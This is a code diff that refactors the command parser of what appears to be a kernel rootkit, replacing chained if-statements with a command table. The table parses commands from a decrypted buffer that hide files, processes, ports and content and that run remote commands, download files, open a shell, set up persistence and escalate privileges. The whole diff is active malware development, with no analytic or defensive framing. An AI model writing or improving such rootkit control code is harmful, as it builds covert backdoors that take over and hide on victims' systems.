@@ -58,30 +58,53 @@ static size_t rk_strip(const char *buf, size_t len)
 	return len;
 }
 
-/* Check if buf starts with prefix (case-sensitive). */
-static bool rk_prefix(const char *buf, size_t len, const char *prefix,
-		       size_t plen)
-{
-	if (len < plen)
-		return false;
-	return memcmp(buf, prefix, plen) == 0;
-}
+/* ------------------------------------------------------------------ */
+/* Command table                                                       */
+/* ------------------------------------------------------------------ */
 
-/* Check if buf exactly matches word (after stripping). */
-static bool rk_exact(const char *buf, size_t len, const char *word)
-{
-	size_t wlen = strlen(word);
+struct rk_cmd_entry {
+	const char *keyword;
+	size_t keyword_len;
+	enum rk_cmd_kind kind;
+	bool has_arg;
+};
 
-	return len == wlen && memcmp(buf, word, wlen) == 0;
-}
+/* Prefixed commands: keyword includes the trailing space before the argument.
+ * Bare commands: keyword is the full match (no argument). */
+static const struct rk_cmd_entry cmd_table[] = {
+	/* Two-word prefixed commands (with arguments) */
+	{ "HIDE FILE ",      10, RK_CMD_HIDE_FILE,      true  },
+	{ "UNHIDE FILE ",    12, RK_CMD_UNHIDE_FILE,    true  },
+	{ "HIDE PID ",        9, RK_CMD_HIDE_PID,       true  },
+	{ "UNHIDE PID ",     11, RK_CMD_UNHIDE_PID,     true  },
+	{ "HIDE CONTENT ",   13, RK_CMD_HIDE_CONTENT,   true  },
+	{ "UNHIDE CONTENT ", 15, RK_CMD_UNHIDE_CONTENT, true  },
+	{ "HIDE PORT ",      10, RK_CMD_HIDE_PORT,      true  },
+	{ "UNHIDE PORT ",    12, RK_CMD_UNHIDE_PORT,    true  },
+	/* Single-word prefixed commands (with arguments) */
+	{ "EXEC ",            5, RK_CMD_EXEC,           true  },
+	{ "DOWNLOAD ",        9, RK_CMD_DOWNLOAD,       true  },
+	{ "LIST ",            5, RK_CMD_LIST,           true  },
+	/* Bare keywords (no arguments) */
+	{ "PING",             4, RK_CMD_PING,           false },
+	{ "STATUS",           6, RK_CMD_STATUS,         false },
+	{ "SHELL",            5, RK_CMD_SHELL,          false },
+	{ "PERSIST",          7, RK_CMD_PERSIST,        false },
+	{ "UNPERSIST",        9, RK_CMD_UNPERSIST,      false },
+	{ "ESCALATE",         8, RK_CMD_ESCALATE,       false },
+	{ "INFO",             4, RK_CMD_INFO,           false },
+};
 
 /* ------------------------------------------------------------------ */
 /* Command parser                                                      */
 /* ------------------------------------------------------------------ */
 
 /* Parse a text command from a decrypted buffer into a structured command. */
-static int __maybe_unused rk_command_parse(const char *buf, size_t len, struct rk_command *cmd)
+static int __maybe_unused rk_command_parse(const char *buf, size_t len,
+					   struct rk_command *cmd)
 {
+	int i;
+
 	cmd->kind = RK_CMD_UNKNOWN;
 	cmd->arg[0] = '\0';
 
@@ -89,93 +112,24 @@ static int __maybe_unused rk_command_parse(const char *buf, size_t len, struct r
 	if (!len)
 		return -EINVAL;
 
-	/* Two-word prefixed commands with arguments. */
-	if (rk_prefix(buf, len, "HIDE FILE ", 10)) {
-		cmd->kind = RK_CMD_HIDE_FILE;
-		rk_copy_arg(cmd, buf + 10, len - 10);
-		return 0;
-	}
-	if (rk_prefix(buf, len, "UNHIDE FILE ", 12)) {
-		cmd->kind = RK_CMD_UNHIDE_FILE;
-		rk_copy_arg(cmd, buf + 12, len - 12);
-		return 0;
-	}
-	if (rk_prefix(buf, len, "HIDE PID ", 9)) {
-		cmd->kind = RK_CMD_HIDE_PID;
-		rk_copy_arg(cmd, buf + 9, len - 9);
-		return 0;
-	}
-	if (rk_prefix(buf, len, "UNHIDE PID ", 11)) {
-		cmd->kind = RK_CMD_UNHIDE_PID;
-		rk_copy_arg(cmd, buf + 11, len - 11);
-		return 0;
-	}
-	if (rk_prefix(buf, len, "HIDE CONTENT ", 13)) {
-		cmd->kind = RK_CMD_HIDE_CONTENT;
-		rk_copy_arg(cmd, buf + 13, len - 13);
-		return 0;
-	}
-	if (rk_prefix(buf, len, "UNHIDE CONTENT ", 15)) {
-		cmd->kind = RK_CMD_UNHIDE_CONTENT;
-		rk_copy_arg(cmd, buf + 15, len - 15);
-		return 0;
-	}
-	if (rk_prefix(buf, len, "HIDE PORT ", 10)) {
-		cmd->kind = RK_CMD_HIDE_PORT;
-		rk_copy_arg(cmd, buf + 10, len - 10);
-		return 0;
-	}
-	if (rk_prefix(buf, len, "UNHIDE PORT ", 12)) {
-		cmd->kind = RK_CMD_UNHIDE_PORT;
-		rk_copy_arg(cmd, buf + 12, len - 12);
-		return 0;
-	}
+	for (i = 0; i < ARRAY_SIZE(cmd_table); i++) {
+		const struct rk_cmd_entry *e = &cmd_table[i];
 
-	/* Single-word commands with arguments. */
-	if (rk_prefix(buf, len, "EXEC ", 5)) {
-		cmd->kind = RK_CMD_EXEC;
-		rk_copy_arg(cmd, buf + 5, len - 5);
-		return 0;
-	}
-	if (rk_prefix(buf, len, "DOWNLOAD ", 9)) {
-		cmd->kind = RK_CMD_DOWNLOAD;
-		rk_copy_arg(cmd, buf + 9, len - 9);
-		return 0;
-	}
-	if (rk_prefix(buf, len, "LIST ", 5)) {
-		cmd->kind = RK_CMD_LIST;
-		rk_copy_arg(cmd, buf + 5, len - 5);
-		return 0;
-	}
-
-	/* Bare keywords (no arguments). */
-	if (rk_exact(buf, len, "PING")) {
-		cmd->kind = RK_CMD_PING;
-		return 0;
-	}
-	if (rk_exact(buf, len, "STATUS")) {
-		cmd->kind = RK_CMD_STATUS;
-		return 0;
-	}
-	if (rk_exact(buf, len, "SHELL")) {
-		cmd->kind = RK_CMD_SHELL;
-		return 0;
-	}
-	if (rk_exact(buf, len, "PERSIST")) {
-		cmd->kind = RK_CMD_PERSIST;
-		return 0;
-	}
-	if (rk_exact(buf, len, "UNPERSIST")) {
-		cmd->kind = RK_CMD_UNPERSIST;
-		return 0;
-	}
-	if (rk_exact(buf, len, "ESCALATE")) {
-		cmd->kind = RK_CMD_ESCALATE;
-		return 0;
-	}
-	if (rk_exact(buf, len, "INFO")) {
-		cmd->kind = RK_CMD_INFO;
-		return 0;
+		if (e->has_arg) {
+			if (len >= e->keyword_len &&
+			    memcmp(buf, e->keyword, e->keyword_len) == 0) {
+				cmd->kind = e->kind;
+				rk_copy_arg(cmd, buf + e->keyword_len,
+					    len - e->keyword_len);
+				return 0;
+			}
+		} else {
+			if (len == e->keyword_len &&
+			    memcmp(buf, e->keyword, e->keyword_len) == 0) {
+				cmd->kind = e->kind;
+				return 0;
+			}
+		}
 	}
 
 	return 0;
